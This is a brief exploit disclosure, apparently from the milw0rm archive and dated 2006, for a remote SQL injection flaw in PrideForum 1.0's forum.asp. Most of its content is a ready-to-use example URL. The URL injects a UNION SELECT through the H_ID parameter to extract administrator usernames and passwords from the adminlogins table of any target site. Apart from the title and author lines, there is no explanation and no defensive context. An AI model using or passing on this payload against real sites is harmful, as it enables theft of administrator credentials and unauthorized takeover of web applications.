# Title  :   PrideForum 1.0 (forum.asp) Remote SQL Injection Vulnerability
# Author :   ajann

# Exploit Example:
http://[target]/[path]/forum.asp?H_ID=1%20union+select+0,0,ID,J_User,0,0,0,J_Pass,ID,0+from+adminlogins+where+ID=1&Name=Allm%E4nt

# milw0rm.com [2006-05-27]